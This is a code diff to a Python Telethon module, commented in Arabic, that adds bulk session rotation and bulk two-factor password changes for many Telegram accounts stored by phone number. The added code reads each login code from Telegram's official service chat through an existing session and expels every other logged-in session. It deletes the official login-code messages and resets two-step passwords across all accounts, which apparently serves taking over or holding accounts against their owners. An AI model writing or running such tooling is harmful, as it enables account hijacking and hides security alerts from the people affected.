@@ -49,6 +49,7 @@ from telethon.tl.functions.auth import (
     ResetAuthorizationsRequest,
     ResendCodeRequest,
     SendCodeRequest,
+    LogOutRequest,
 )
 
 import database
@@ -1125,6 +1126,223 @@ async def kick_specific_session(phone: str, session_hash: int) -> bool:
         logger.error(f"kick_specific {phone} {session_hash}: {e}")
         await client.disconnect()
         return False
+
+
+async def rotate_session(phone: str) -> dict:
+    """
+    تغيير الجلسة بالكامل — الكود يُطلب بالطريقة العادية ويُقرأ من 777000 عبر الجلسة القديمة:
+    1. فتح الجلسة القديمة وجلب hashes الجلسات الأخرى
+    2. تصوير آخر رسالة في 777000 (حتى لا نقرأ كوداً قديماً)
+    3. طلب كود دخول جديد من client_new (يصل لشات التيليجرام كرسالة)
+    4. قراءة الكود من 777000 عبر client_old (الجلسة المسجّلة)
+    5. تسجيل الدخول بـ client_new
+    6. حفظ الجلسة الجديدة في DB
+    7. طرد الجلسات الأخرى القديمة بـ client_old
+    8. تسجيل خروج client_old نفسها
+    """
+    row = await database.get_session_by_phone(phone)
+    if not row:
+        return {"success": False, "error": "الجلسة غير موجودة"}
+
+    client_old = None
+    client_new = None
+
+    try:
+        # 1. فتح الجلسة القديمة
+        client_old = await get_active_client(phone)
+        if not client_old:
+            return {"success": False, "error": "الجلسة غير متصلة حالياً"}
+
+        # جلب hashes الجلسات الأخرى (قبل إنشاء الجديدة)
+        other_hashes = []
+        try:
+            auths_result = await client_old(GetAuthorizationsRequest())
+            other_hashes = [a.hash for a in auths_result.authorizations if not a.current]
+            logger.info("rotate_session %s: found %d other sessions", phone, len(other_hashes))
+        except Exception as e:
+            logger.warning("rotate_session get_auths %s: %s", phone, e)
+
+        # 2. تصوير آخر ID في شات 777000 و 42777 (snapshot) حتى لا نلتقط كوداً قديماً
+        snapshot: dict[int, int] = {}
+        for sender_id in OFFICIAL_SENDERS:
+            try:
+                msgs = await client_old.get_messages(sender_id, limit=1)
+                snapshot[sender_id] = msgs[0].id if msgs else 0
+            except Exception:
+                snapshot[sender_id] = 0
+
+        # 3. إنشاء client_new (جلسة فارغة) وطلب كود — الكود سيصل للتيليجرام
+        client_new = make_telegram_client()
+        await client_new.connect()
+
+        sent = await _send_login_code_request(client_new, phone)
+        phone_code_hash = sent.phone_code_hash
+        logger.info("rotate_session %s: code requested, delivery=%s", phone, type(sent.type).__name__)
+
+        # 4. قراءة الكود من شات التيليجرام (777000 أو 42777) عبر client_old
+        code_text: str | None = None
+        loop = asyncio.get_running_loop()
+        deadline = loop.time() + 180  # انتظار 3 دقائق كحد أقصى
+        while loop.time() < deadline:
+            await asyncio.sleep(3)
+            for sender_id, last_id in list(snapshot.items()):
+                try:
+                    new_msgs = await client_old.get_messages(sender_id, limit=8)
+                    for msg in new_msgs:
+                        if msg.id > last_id and msg.text and CODE_PATTERN.search(msg.text):
+                            code_text = msg.text
+                            break
+                    if new_msgs:
+                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
+                except Exception:
+                    pass
+                if code_text:
+                    break
+            if code_text:
+                break
+
+        if not code_text:
+            return {"success": False, "error": "لم يصل الكود في شات التيليجرام خلال 3 دقائق"}
+
+        code = _normalize_login_code(code_text)
+        if not code:
+            return {"success": False, "error": f"كود غير قابل للقراءة: {code_text[:50]}"}
+
+        logger.info("rotate_session %s: got code from Telegram chat", phone)
+
+        # 5. تسجيل الدخول بالجلسة الجديدة
+        try:
+            await client_new.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        except SessionPasswordNeededError:
+            two_fa = (row["two_fa"] or DEFAULT_2FA_PASSWORD or "").strip()
+            if not two_fa:
+                return {"success": False, "error": "الحساب محمي بـ 2FA غير محفوظ في DB"}
+            await client_new.sign_in(password=two_fa)
+
+        session_new = client_new.session.save()
+        logger.info("rotate_session %s: new session obtained", phone)
+
+        # 6. حفظ الجلسة الجديدة في DB قبل أي طرد
+        await database.update_session_string(phone, session_new)
+        logger.info("rotate_session %s: DB updated with new session", phone)
+
+        # 7. طرد الجلسات الأخرى القديمة باستخدام client_old
+        for h in other_hashes:
+            try:
+                await client_old(ResetAuthorizationRequest(hash=h))
+                logger.debug("rotate_session %s: kicked hash %s", phone, h)
+            except Exception as e:
+                logger.debug("rotate_session kick hash %s for %s: %s", h, phone, e)
+
+        # 8. تسجيل خروج الجلسة القديمة نفسها
+        try:
+            await client_old(LogOutRequest())
+            logger.info("rotate_session %s: old session logged out", phone)
+        except Exception as e:
+            logger.debug("rotate_session logout old %s: %s", phone, e)
+
+        # حذف رسائل كود الدخول من الجلسة الجديدة
+        try:
+            await delete_telegram_official_messages(client_new)
+        except Exception:
+            pass
+
+        return {"success": True}
+
+    except Exception as e:
+        logger.error("rotate_session %s: %s", phone, e)
+        return {"success": False, "error": str(e)}
+
+    finally:
+        if client_new:
+            try:
+                await client_new.disconnect()
+            except Exception:
+                pass
+        if client_old:
+            try:
+                await client_old.disconnect()
+            except Exception:
+                pass
+
+
+async def bulk_rotate_sessions() -> dict:
+    """
+    تغيير جلسات كل الحسابات المتصلة.
+    يتخطى الحسابات غير المتصلة فقط.
+    """
+    sessions = await database.get_all_sessions()
+    success_count = 0
+    fail_count = 0
+    skip_count = 0
+    fail_details = []
+
+    for s in sessions:
+        phone = s["phone"]
+
+        alive = await check_session_alive(phone)
+        if not alive:
+            skip_count += 1
+            logger.info("bulk_rotate skip %s: not alive", phone)
+            continue
+
+        logger.info("bulk_rotate processing %s", phone)
+        res = await rotate_session(phone)
+        if res["success"]:
+            success_count += 1
+            logger.info("bulk_rotate success %s", phone)
+        else:
+            fail_count += 1
+            fail_details.append(f"{phone}: {res.get('error', '')}")
+            logger.warning("bulk_rotate fail %s: %s", phone, res.get("error"))
+
+        await asyncio.sleep(3)
+
+    return {
+        "success": success_count,
+        "fail": fail_count,
+        "skip": skip_count,
+        "total": len(sessions),
+        "fail_details": fail_details,
+    }
+
+
+async def bulk_change_two_fa(new_password: str) -> dict:
+    """
+    تغيير التحقق بخطوتين لكل الحسابات التي لها two_fa محفوظ في DB.
+    """
+    sessions = await database.get_all_sessions()
+    success_count = 0
+    fail_count = 0
+    skip_count = 0
+    fail_details = []
+
+    for s in sessions:
+        phone = s["phone"]
+        old_2fa = s["two_fa"]
+
+        if not old_2fa:
+            skip_count += 1
+            continue
+
+        res = await set_two_fa(phone, new_password, old_2fa)
+        if res["success"]:
+            success_count += 1
+            logger.info("bulk_change_2fa success %s", phone)
+        else:
+            fail_count += 1
+            fail_details.append(f"{phone}: {res.get('error', '')}")
+            logger.warning("bulk_change_2fa fail %s: %s", phone, res.get("error"))
+
+        await asyncio.sleep(1)
+
+    return {
+        "success": success_count,
+        "fail": fail_count,
+        "skip": skip_count,
+        "total": len(sessions),
+        "fail_details": fail_details,
+    }
 
 
 async def set_direct_2fa(phone: str, new_password: str) -> dict:
